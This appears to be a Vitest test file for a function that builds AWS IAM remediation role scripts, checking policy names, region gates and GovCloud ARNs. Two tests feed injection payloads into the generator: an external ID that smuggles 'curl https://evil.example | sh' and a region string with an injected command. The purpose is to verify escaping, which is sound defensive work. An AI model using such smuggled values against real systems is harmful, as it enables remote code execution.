import { describe, expect, it } from 'vitest';
import { getAwsRemediationScriptForPair } from '../remediation-script';

describe('getAwsRemediationScriptForPair', () => {
  it('mints a per-pair role with the 3-statement policy and region gate', () => {
    const script = getAwsRemediationScriptForPair(
      'aws',
      { assetClass: 'Storage', region: 'us-east-1' },
      'org_abc123',
    );
    expect(script).toContain('ROLE_NAME="OpenComp-Remediator-Storage-us-east-1"');
    expect(script).toContain('EXTERNAL_ID="org_abc123"');
    expect(script).toContain('FixForwardOnly');
    expect(script).toContain('DenyOutsideRegion');
    expect(script).toContain('NeverDestructive');
    expect(script).toContain('"aws:RequestedRegion":["us-east-1"]');
    expect(script).toContain('--max-session-duration 3600');
    // Monolith-only surface must not leak into per-pair roles.
    expect(script).not.toContain('OpenComp-Rollback');
    expect(script).not.toContain('ROLE_NAME="OpenComp-Remediator"');
  });

  it('pins Security-Global with a human-approval warning and no region gate', () => {
    const script = getAwsRemediationScriptForPair(
      'aws',
      { assetClass: 'Security-Global', region: 'eu-west-1' },
      'org_abc123',
    );
    expect(script).toContain('ROLE_NAME="OpenComp-Remediator-Security-Global"');
    expect(script).toContain('human approval');
    expect(script).not.toContain('DenyOutsideRegion');
    expect(script).not.toContain('aws:RequestedRegion');
  });

  it('uses the GovCloud roleAssumer for the GovCloud partition', () => {
    const script = getAwsRemediationScriptForPair(
      'aws-us-gov',
      { assetClass: 'Data', region: 'us-gov-west-1' },
      'org_abc123',
    );
    expect(script).toContain('arn:aws-us-gov:iam::633779453318:role/roleAssumer');
    expect(script).toContain('OpenComp-Remediator-Data-us-gov-west-1');
  });

  it('escapes a hostile external ID so it cannot break out of its quotes', () => {
    const script = getAwsRemediationScriptForPair(
      'aws',
      { assetClass: 'Storage', region: 'us-east-1' },
      'org"; curl https://evil.example | sh; #',
    );
    expect(script).toContain('EXTERNAL_ID="org\\"; curl https://evil.example | sh; #"');
    expect(script).not.toContain('EXTERNAL_ID="org";');
  });

  it('refuses to mint a script for a shell-unsafe region', () => {
    expect(() =>
      getAwsRemediationScriptForPair(
        'aws',
        { assetClass: 'Storage', region: 'us-east-1"; evil #' },
        'org_abc123',
      ),
    ).toThrow();
  });
});
